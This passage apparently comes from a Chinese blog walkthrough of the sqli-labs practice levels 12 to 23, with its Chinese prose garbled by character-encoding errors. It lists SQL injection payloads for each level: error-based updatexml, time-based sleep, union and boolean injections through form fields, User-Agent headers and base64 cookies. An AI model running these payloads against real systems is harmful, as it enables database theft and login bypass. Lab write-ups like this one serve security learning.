<span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=2--+ # ç™»é™†é”™è¯¯<br><br></code></pre></td></tr></table></figure><p>è¿™é‡Œéå¸¸ç±»ä¼¼å‰é¢ GET çš„åŸºäºå¸ƒå°”çš„å­—ç¬¦å‹æ³¨å…¥ã€‚å»¶æ—¶æ³¨å…¥æ˜¯åŸºäºå¸ƒå°”æ³¨å…¥çš„ï¼Œå½“ç•Œé¢æ— æ³•è¿›è¡Œå›æ˜¾çš„æ—¶å€™æ‰ä¼šè€ƒè™‘ä½¿ç”¨å»¶æ—¶æ³¨å…¥ã€‚</p></li></ul><hr><h2 id="less-12"><a href="#less-12" class="headerlink" title="less-12"></a>less-12</h2><p>é—­åˆæ–¹å¼ï¼š<code>password=(&#39;$passwd&#39;)</code></p><p>ç±»ä¼¼ä¸Šé¢˜åªä½¿ç”¨ä¸€ä¸ªå•å¼•å·è¿›è¡Œé—­åˆï¼Œæ¥è§‚å¯ŸæŠ¥é”™ä¿¡æ¯ï¼Œæ ¹æ®æŠ¥é”™ä¿¡æ¯æ¥è¿›è¡Œæ³¨å…¥ã€‚</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br><span class="hljs-attribute">passwd</span>=Dumb&amp;uname=Dumb&#x27;<br><br></code></pre></td></tr></table></figure><p>å°±èƒ½çœ‹åˆ°å¦‚ä¸‹æŠ¥é”™ä¿¡æ¯<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/B22699CD-05DD-41B8-A46E-19C3EB9BE8ED.png"><br>å¯ä»¥ä»ä¸Šå›¾çœ‹åˆ°ï¼Œåœ¨å•å¼•å·ä¹‹åæœ‰ä¸€ä¸ªå•å¼•å·å’Œæ‹¬å·ï¼Œè¯´æ˜è¿™é¢˜éœ€è¦ä½¿ç”¨æ‹¬å·ã€‚</p><p>å†æ¬¡å°è¯•é—­åˆSQLè¯­å¥</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br><span class="hljs-attribute">passwd</span>=Dumb&amp;uname=Dumb&#x27;)  --+<br><br></code></pre></td></tr></table></figure><p>æ­£å¸¸ç™»é™†åï¼Œè¿™é¢˜å¹¶æ²¡æœ‰æ˜¾ç¤ºæŸ¥è¯¢ç»“æœï¼Œåªæ˜¯æ˜¾ç¤ºä½ æ˜¯å¦ç™»é™†ï¼Œæ‰€ä»¥ä¸èƒ½ä½¿ç”¨è”åˆæ³¨å…¥ã€‚</p><p>å°è¯•æŠ¥é”™æ³¨å…¥ï¼ˆæŠ¥é”™æ³¨å…¥é€šè¿‡æŠ¥é”™ä¿¡æ¯è¿›è¡Œå›æ˜¾ï¼‰ã€‚</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><br><span class="hljs-attribute">passwd</span>=Dumb&amp;uname=Dumb&#x27;)  and updatexml(<span class="hljs-number">1</span>, concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e, (select database()), <span class="hljs-number">0</span>x<span class="hljs-number">7</span>e), <span class="hljs-number">1</span>)--+<br><br></code></pre></td></tr></table></figure><p>æ ¹æ®å›æ˜¾ç»“æœå¯ä»¥çœ‹å‡ºï¼šè¯¥é¢˜èƒ½æ­£å¸¸å›æ˜¾æŠ¥é”™ä¿¡æ¯ï¼Œå³å¯ä»¥è¿›è¡ŒæŠ¥é”™æ³¨å…¥ã€‚</p><p>å°è¯•æ—¶é—´ç›²æ³¨ã€‚</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><br><span class="hljs-attribute">passwd</span>=Dumb&amp;uname=Dumb&#x27;)  and if(left(database(), <span class="hljs-number">1</span>)=&#x27;s&#x27;, sleep(<span class="hljs-number">3</span>), <span class="hljs-number">1</span>)--+<br><br></code></pre></td></tr></table></figure><p>èƒ½å‘ç°æœ‰æ˜æ˜¾çš„ç­‰å¾…ï¼Œå³å¯ä»¥è¿›è¡Œæ—¶é—´ç›²æ³¨ã€‚</p><hr><h2 id="less-14"><a href="#less-14" class="headerlink" title="less-14"></a>less-14</h2><p>é—­åˆæ–¹å¼ï¼š<code>password=&quot;$passwd&quot;</code></p><p>ç±»ä¼¼å‰é¢çš„æ­¥éª¤è¿›è¡Œæµ‹è¯•ã€‚</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br><span class="hljs-attribute">passwd</span>=Dumb&amp;uname=Dumb&#x27;<br><span class="hljs-attribute">passwd</span>=Dumb&amp;uname=Dumb&quot;<br><br></code></pre></td></tr></table></figure><p>å¯ä»¥é€šè¿‡ æŠ¥é”™ä¿¡æ¯è§‚å¯Ÿåˆ° SQL è¯­å¥çš„å±€éƒ¨ï¼Œé€šè¿‡å±€éƒ¨æ¥æ¨æµ‹è‡ªå·±çš„SQLåº”è¯¥å¦‚ä½•å†™ã€‚</p><p>æŠ¥é”™æ³¨å…¥ Payload</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br><span class="hljs-attribute">passwd</span>=Dumb&amp;uname=Dumb&quot; <span class="hljs-keyword">and</span> updatexml(1, concat(0x7e, database(), 0x7e), 1)--+<br><br></code></pre></td></tr></table></figure><p>æ—¶é—´ç›²æ³¨ Payload</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br><span class="hljs-attribute">passwd</span>=Dumb&amp;uname=Dumb&quot; <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(length(database())=8, sleep(3), 1)--+<br><br></code></pre></td></tr></table></figure><hr><h2 id="less-15"><a href="#less-15" class="headerlink" title="less-15"></a>less-15</h2><p>é—­åˆæ–¹å¼ï¼š<code>password=&#39;$passwd&#39;</code></p><p>å°è¯•ä½¿ç”¨å‰é¢çš„æ­¥éª¤å›æ˜¾å‡º SQL è¯­å¥</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br><span class="hljs-attribute">passwd</span>=Dumb&amp;uname=Dumb&#x27;<br><span class="hljs-attribute">passwd</span>=Dumb&amp;uname=Dumb&quot;<br><br></code></pre></td></tr></table></figure><p>æ²¡æœ‰å›æ˜¾æŠ¥é”™ä¿¡æ¯ï¼Œè€Œä¸”éƒ½ç™»é™†å¤±è´¥ï¼ŒçŒœæµ‹å¯èƒ½å…³é—­å’ŒæŠ¥é”™çš„è¾“å‡º</p><p>å°è¯•ç›´æ¥æ³¨é‡Šï¼Œå¦‚æœèƒ½SQLæ³¨å…¥ï¼Œé‚£ä¹ˆç”¨æˆ·åæ­£ç¡®å°±èƒ½ç™»é™†ç³»ç»Ÿã€‚</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br><span class="hljs-attribute">passwd</span>=Dumb&amp;uname=Dumb&#x27;  --+<br><br></code></pre></td></tr></table></figure><p>ç™»é™†æˆåŠŸã€‚</p><p>æˆ‘ä»¬å¯ä»¥åœ¨åé¢æ‹¼æ¥ andï¼Œand ä¹‹åçš„å€¼ä¸º true å°±ä¼šæ­£å¸¸ç™»é™†ï¼Œå€¼ä¸º false å°±ç™»é™†å¤±è´¥ã€‚ï¼ˆæˆ‘ä»¬æ‹¼æ¥çš„ SQL è¯­å¥éƒ½åœ¨ where åï¼Œwhere è¯­å¥çš„åŠŸèƒ½å°±æ˜¯æ ¹æ®å¸ƒå°”å€¼è¿›è¡Œç­›é€‰ï¼‰</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br><span class="hljs-attribute">passwd</span>=Dumb&amp;uname=Dumb&#x27; <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=1  --+<br><span class="hljs-attribute">passwd</span>=Dumb&amp;uname=Dumb&#x27; <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=2  --+<br><br></code></pre></td></tr></table></figure><hr><h2 id="less-16"><a href="#less-16" class="headerlink" title="less-16"></a>less-16</h2><p>é—­åˆæ–¹å¼ï¼š<code>password=(&quot;$passwd&quot;)</code></p><p>æ–¹æ³•åŒä¸Š</p><hr><h2 id="less-17"><a href="#less-17" class="headerlink" title="less-17"></a>less-17</h2><p>é—­åˆæ–¹å¼ï¼š<code>password = &#39;$passwd&#39;</code></p><p>è¿›è¡Œç®€å•æµ‹è¯•</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br><span class="hljs-attribute">passwd</span>=Dumb&amp;uname=Dumb&#x27;<br><span class="hljs-attribute">passwd</span>=Dumb&amp;uname=Dumb&#x27; --+<br><br></code></pre></td></tr></table></figure><p>å¹¶æ²¡æœ‰ç»“æœè¿”å›</p><p>æŸ¥çœ‹æºç åå‘ç°ï¼Œåœ¨æ‰§è¡ŒSQLè¯­å¥ä¹‹å‰å¯¹è¾“å…¥çš„ç”¨æˆ·ååšäº†æ£€æŸ¥ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_input</span>(<span class="hljs-params">$value</span>)</span><br><span class="hljs-function">    </span>&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>($value))<br>        &#123;<br>        <span class="hljs-comment">// truncation (see comments)</span><br>        $value = substr($value,<span class="hljs-number">0</span>,<span class="hljs-number">15</span>);<br>        &#125;<br> <br>        <span class="hljs-comment">// Stripslashes if magic quotes enabled</span><br>        <span class="hljs-keyword">if</span> (get_magic_quotes_gpc())<br>            &#123;<br>            $value = stripslashes($value);<br>            &#125;<br> <br>        <span class="hljs-comment">// Quote if not a number</span><br>        <span class="hljs-keyword">if</span> (!ctype_digit($value))<br>            &#123;<br>            $value = <span class="hljs-string">&quot;&#x27;&quot;</span> . mysql_real_escape_string($value) . <span class="hljs-string">&quot;&#x27;&quot;</span>;<br>            &#125;<br>        <br>    <span class="hljs-keyword">else</span><br>        &#123;<br>        $value = intval($value);<br>        &#125;<br>    <span class="hljs-keyword">return</span> $value;<br>    &#125;<br>    <br></code></pre></td></tr></table></figure><ul><li>magic_quotes_gpc å‡½æ•°åœ¨ php ä¸­çš„ä½œç”¨æ˜¯åˆ¤æ–­è§£æç”¨æˆ·æç¤ºçš„æ•°æ®ï¼Œå¦‚åŒ…æ‹¬æœ‰ï¼špostã€getã€cookieè¿‡æ¥çš„æ•°æ®å¢åŠ è½¬ä¹‰å­—ç¬¦â€œ\â€ï¼Œä»¥ç¡®ä¿è¿™äº›æ•°æ®ä¸ä¼šå¼•èµ·ç¨‹åºï¼Œç‰¹åˆ«æ˜¯æ•°æ®åº“è¯­å¥å› ä¸ºç‰¹æ®Šå­—ç¬¦å¼•èµ·çš„æ±¡æŸ“è€Œå‡ºç°è‡´å‘½çš„é”™è¯¯ã€‚åœ¨ magic_quotes_gpc = On çš„æƒ…å†µä¸‹ï¼Œå¦‚æœè¾“å…¥çš„æ•°æ®æœ‰ï¼š<ol><li>å•å¼•å·ï¼ˆâ€™ï¼‰</li><li>åŒå¼•å·ï¼ˆâ€ï¼‰</li><li>åæ–œçº¿ï¼ˆ\ï¼‰</li><li>NULLï¼ˆNULL å­—ç¬¦ï¼‰<br>ï¼ˆå­—ç¬¦éƒ½ä¼šè¢«åŠ ä¸Šåæ–œçº¿ï¼‰</li></ol></li><li>stripslashes() åˆ é™¤ç”± addslashes() å‡½æ•°æ·»åŠ çš„åæ–œæ </li><li>ctype_digit() åˆ¤æ–­æ˜¯ä¸æ˜¯æ•°å­—ï¼Œæ˜¯æ•°å­—å°±è¿”å› trueï¼Œå¦åˆ™è¿”å› false</li><li>mysql_real_escape_string() è½¬ä¹‰ SQL è¯­å¥ä¸­ä½¿ç”¨çš„å­—ç¬¦ä¸²ä¸­çš„ç‰¹æ®Šå­—ç¬¦ã€‚</li><li>intval()   æ•´å‹è½¬æ¢</li></ul><p>ä½†æ˜¯æ²¡æœ‰å¯¹å¯†ç è¿›è¡Œé™åˆ¶ï¼Œpasswordè¢«ç›´æ¥æ‹¼æ¥åˆ°SQLè¯­å¥ä¸­ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br><span class="hljs-variable">$update</span>=<span class="hljs-string">&quot;UPDATE users SET password = &#x27;<span class="hljs-variable">$passwd</span>&#x27; WHERE username=&#x27;<span class="hljs-variable">$row1</span>&#x27;&quot;</span>;<br><br></code></pre></td></tr></table></figure><p>ç„¶åå‘ç°ä½¿ç”¨ <code>passwd=Dumb&#39; and 1=1 --+&amp;uname=Dumb</code> ä¼šå‘ç”ŸæŠ¥é”™å¹¶å°†æŠ¥é”™ä¿¡æ¯è¿›è¡Œæ˜¾ç¤ºã€‚å‘é€ä¸‹é¢çš„æ•°æ®ï¼Œå°±å¯ä»¥è¿›è¡ŒæŠ¥é”™æ³¨å…¥ã€‚</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><br><span class="hljs-attribute">passwd</span>=Dumb&#x27; and updatexml(<span class="hljs-number">1</span>, concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e, user(), <span class="hljs-number">0</span>x<span class="hljs-number">7</span>e), <span class="hljs-number">1</span>) --+&amp;uname=Dumb<br><br></code></pre></td></tr></table></figure><p>æ—¶é—´ç›²æ³¨ Payload</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br><span class="hljs-attribute">passwd</span>=Dumb&#x27;  WHERE <span class="hljs-attribute">username</span>=<span class="hljs-string">&#x27;Dumb&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(1, sleep(3), 2) --+&amp;<span class="hljs-attribute">uname</span>=Dumb # æ˜æ˜¾å»¶æ—¶<br><span class="hljs-attribute">passwd</span>=Dumb&#x27;  WHERE <span class="hljs-attribute">username</span>=<span class="hljs-string">&#x27;Dumb&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(0, sleep(3), 2) --+&amp;<span class="hljs-attribute">uname</span>=Dumb<br><br></code></pre></td></tr></table></figure><hr><h2 id="less-18"><a href="#less-18" class="headerlink" title="less-18"></a>less-18</h2><p>é—­åˆæ–¹å¼ï¼š<code>VALUES (&#39;$uagent&#39;)</code>ï¼ˆä¸¤ä¾§é—­åˆï¼‰</p><p>ç™»é™†ä¹‹åï¼Œå‘ç°æŸ¥è¯¢åˆ°çš„ä¿¡æ¯æ˜¯ User-agentï¼Œå°è¯•åœ¨ Hackbar æ·»åŠ  Headerã€‚<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/65A5263E-2378-4E6B-BAEF-B7C5F43C18A9.png"><br>å‘ç°æŠ¥é”™ä¿¡æ¯ï¼Œè¯´æ˜å¯ä»¥é‡‡ç”¨æŠ¥é”™æ³¨å…¥çš„æ–¹å¼è·å¾—å›æ˜¾ä¿¡æ¯ã€‚</p><p>å°è¯•é—­åˆSQLè¯­å¥</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs lsl"><br><span class="hljs-number">1</span>&#x27; and sleep(<span class="hljs-number">3</span>) --+<br><span class="hljs-number">1</span>&#x27; and sleep(<span class="hljs-number">3</span>) #<br><span class="hljs-number">1</span>&#x27; and sleep(<span class="hljs-number">3</span>) %<span class="hljs-number">23</span><br><br></code></pre></td></tr></table></figure><p>å¹¶æ²¡æœ‰æ”¶è·</p><p>æŸ¥çœ‹æºç åå‘ç° password å’Œ username éƒ½è¢«ä¸Šä¸€é¢˜çš„æ£€æŸ¥å‡½æ•°æ‰€æ£€æŸ¥ï¼Œè€Œ User-agent åœ¨å¦ä¸€ä¸ª SQL è¯­å¥ï¼ˆæ’å…¥æ•°æ®ï¼‰ä¸­ï¼Œæ‰€ä»¥ä¸ç®¡æ€ä¹ˆåŒ…è£¹éƒ½æ— æ³•åœ¨ INSERT è¯­å¥ä¸­å¾—åˆ°å›æ˜¾ã€‚<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/8BF2BB30-E839-4B64-AF48-5BD66400980E.png"><br>æ•…éœ€è¦æ¢ä¸€ç§é—­åˆæ–¹å¼ï¼ˆåœ¨ä¸¤ä¾§è¿›è¡Œé—­åˆï¼‰</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs smali"><br>&#x27;<span class="hljs-built_in"> and </span>sleep(3)<span class="hljs-built_in"> and </span>&#x27;<br><br></code></pre></td></tr></table></figure><p>å°† INSERT è¯­å¥é—­åˆæˆ</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><br><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> <span class="hljs-symbol">`security`</span>.<span class="hljs-symbol">`uagents`</span> (<span class="hljs-symbol">`uagent`</span>, <span class="hljs-symbol">`ip_address`</span>, <span class="hljs-symbol">`username`</span>) <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">and</span> sleep(<span class="hljs-number">3</span>) <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-string">&#x27;Dumb&#x27;</span>)<br><br></code></pre></td></tr></table></figure><p>uagent å­—æ®µå°±ä¼šè¢«æ’å…¥â€™â€™å’Œâ€™â€™è¿›è¡Œä¸è¿ç®—çš„ç»“æœï¼ˆå³0ï¼‰</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><br>mysql&gt; select &#x27;&#x27; and sleep(3) and &#x27;<span class="hljs-emphasis">&#x27;;</span><br><span class="hljs-emphasis">+------------------------+</span><br><span class="hljs-emphasis">| &#x27;</span>&#x27; and sleep(3) and &#x27;&#x27; |<br><span class="hljs-code">+------------------------+</span><br>|                      0 |<br><span class="hljs-code">+------------------------+</span><br>1 row in set (0.00 sec)<br><br></code></pre></td></tr></table></figure><p>æŠ¥é”™æ³¨å…¥payload</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs lsl"><br>&#x27; and updatexml(<span class="hljs-number">1</span>, concat(<span class="hljs-number">0x7e</span>, database(), <span class="hljs-number">0x7e</span>), <span class="hljs-number">1</span>) and &#x27;<br><br></code></pre></td></tr></table></figure><hr><h2 id="less-19"><a href="#less-19" class="headerlink" title="less-19"></a>less-19</h2><p>é—­åˆæ–¹å¼ï¼š<code>VALUES (&#39;$uagent&#39;)</code>ï¼ˆä¸¤ä¾§é—­åˆï¼‰</p><p>åŒä¸Šé¢˜é…ç½®ï¼Œä»…å­—æ®µä¸åŒï¼ŒæŠ¥é”™æ³¨å…¥ Payload<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/B2E0F540-D020-4071-8CEC-6350DF9B793E.png"></p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs lsl"><br>&#x27; and updatexml(<span class="hljs-number">1</span>, concat(<span class="hljs-number">0x7e</span>, database(), <span class="hljs-number">0x7e</span>), <span class="hljs-number">1</span>) and &#x27;<br><br></code></pre></td></tr></table></figure><hr><h2 id="less-20"><a href="#less-20" class="headerlink" title="less-20"></a>less-20</h2><p>é—­åˆæ–¹å¼ï¼š<code>username=&#39;$cookee&#39;</code></p><p>æ¨èæ’ä»¶ <code>EditThisCookie</code></p><p>ç™»é™†ä¹‹åï¼Œç½‘é¡µä¸­å­˜å‚¨äº†é”®ä¸º Dumbã€å€¼ä¸º Dumbçš„ Cookieã€‚ä¿®æ”¹ Cookie å€¼ä¹‹åï¼Œè¿›è¡Œåˆ·æ–°å°±èƒ½çœ‹è§æŠ¥é”™ä¿¡æ¯</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><br><span class="hljs-comment"># ä¿®æ”¹Cookieçš„å€¼ä¸º</span><br>Dumb<span class="hljs-string">&#x27; #</span><br><span class="hljs-string"># è¿™é‡Œä¸èƒ½ä½¿ç”¨ --+ã€‚åŸå› ï¼š+ å·åœ¨ Cookie ä¸­ä¸ä¼šè¢« URL è§£ç ä¸ºç©ºæ ¼å¯ä»¥é‡‡ç”¨ä¸‹é¢è¿™ç§æ–¹å¼ã€‚</span><br><span class="hljs-string">Dumb&#x27;</span>--%<span class="hljs-number">20</span><br><br><br><span class="hljs-comment"># æµ‹è¯•å›æ˜¾çš„å­—æ®µ</span><br>Dum<span class="hljs-string">&#x27; union select 1, 2, 3--%20</span><br><span class="hljs-string"># æŸ¥çœ‹æ•°æ®åº“</span><br><span class="hljs-string">Dum&#x27;</span> <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">select</span> 1, 2, <span class="hljs-title">database</span>()--%20</span><br><br></code></pre></td></tr></table></figure><p>è”åˆæ³¨å…¥ Payload</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><br><span class="hljs-attribute">Dum</span>&#x27; union select <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, database()--%<span class="hljs-number">20</span><br><br></code></pre></td></tr></table></figure><p>æŠ¥é”™æ³¨å…¥ Payload</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><br><span class="hljs-attribute">Dum</span>&#x27; and updatexml(<span class="hljs-number">1</span>, concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e, database(), <span class="hljs-number">0</span>x<span class="hljs-number">7</span>e), <span class="hljs-number">1</span>)--%<span class="hljs-number">20</span><br><br></code></pre></td></tr></table></figure><p>å¸ƒå°”ç›²æ³¨ Payload</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><br><span class="hljs-attribute">Dumb</span>&#x27; and if(database()=&#x27;security&#x27;, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>)--%<span class="hljs-number">20</span><br><br></code></pre></td></tr></table></figure><p>æ—¶é—´ç›²æ³¨ Payload</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><br><span class="hljs-attribute">Dumb</span>&#x27; and if(database()=&#x27;security&#x27;, sleep(<span class="hljs-number">3</span>), <span class="hljs-number">0</span>)--%<span class="hljs-number">20</span><br><br></code></pre></td></tr></table></figure><hr><h1 id="3-é«˜çº§æ³¨å…¥-21-37"><a href="#3-é«˜çº§æ³¨å…¥-21-37" class="headerlink" title="3 é«˜çº§æ³¨å…¥(21-37)"></a>3 é«˜çº§æ³¨å…¥(21-37)</h1><h2 id="less-21"><a href="#less-21" class="headerlink" title="less-21"></a>less-21</h2><p>é—­åˆæ–¹å¼ï¼š<code>username=(&#39;$cookee&#39;)</code></p><p>å…³é”®è¯ï¼šcookieã€base64åŠ å¯†ã€å•å¼•å·å’Œæ‹¬å·</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs apache"><br><span class="hljs-comment"># è¿›è¡Œç®€å•çš„é—­åˆ</span><br><span class="hljs-attribute">Dumb</span>&#x27;) #<br><span class="hljs-comment"># base64åŠ å¯†åï¼šRHVtYicpICM=</span><br><br><span class="hljs-comment"># Unionæ³¨å…¥Payload</span><br><span class="hljs-attribute">Dum</span>&#x27;) union select <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>#<br><br><span class="hljs-comment"># æŠ¥é”™æ³¨å…¥Payload</span><br><span class="hljs-attribute">Dum</span>&#x27;) and updatexml(<span class="hljs-number">1</span>, concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e, database(), <span class="hljs-number">0</span>x<span class="hljs-number">7</span>e), <span class="hljs-number">1</span>)-- ï¼ˆæœ€åæœ‰ä¸€ä¸ªç©ºæ ¼ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨#ï¼‰<br><span class="hljs-comment"># base64åŠ å¯†åï¼šRHVtJykgYW5kIHVwZGF0ZXhtbCgxLCBjb25jYXQoMHg3ZSwgZGF0YWJhc2UoKSwgMHg3ZSksIDEpLS0g</span><br><span class="hljs-comment"># æ²¡æœ‰ç©ºæ ¼åŠ å¯†åï¼šRHVtJykgYW5kIHVwZGF0ZXhtbCgxLCBjb25jYXQoMHg3ZSwgZGF0YWJhc2UoKSwgMHg3ZSksIDEpLS0=</span><br><br><span class="hljs-comment"># æ—¶é—´ç›²æ³¨Payload</span><br><span class="hljs-attribute">Dumb</span>&#x27;) and if(database()=&#x27;security&#x27;, sleep(<span class="hljs-number">3</span>), <span class="hljs-number">0</span>)#<br><br></code></pre></td></tr></table></figure><hr><h2 id="less-22"><a href="#less-22" class="headerlink" title="less-22"></a>less-22</h2><p>é—­åˆæ–¹å¼ï¼š <code>username=&quot;$cookee&quot;</code></p><p>å…³é”®è¯ï¼šcookieã€base64åŠ å¯†ã€åŒå¼•å·</p><p>åŒä¸Šä¸€é¢˜ï¼Œå°†å•å¼•å·å’Œæ‹¬å·æ”¹ä¸ºåŒå¼•å·å³å¯</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><br><span class="hljs-comment"># Unionæ³¨å…¥Payload</span><br><span class="hljs-string">Dum&quot;</span> <span class="hljs-string">union</span> <span class="hljs-string">select</span> <span class="hljs-number">1</span><span class="hljs-string">,</span> <span class="hljs-number">2</span><span class="hljs-string">,</span> <span class="hljs-number">3</span><span class="hljs-comment">#</span><br><br></code></pre></td></tr></table></figure><hr><h2 id="less-23"><a href="#less-23" class="headerlink" title="less-23"></a>less-23</h2><p>é—­åˆæ–¹å¼ï¼š<code>id=&#39;$id&#39;</code></p><p>å…³é”®è¯ï¼šåŸºäºé”™è¯¯ã€è¿‡æ»¤æ³¨é‡Š</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><br># 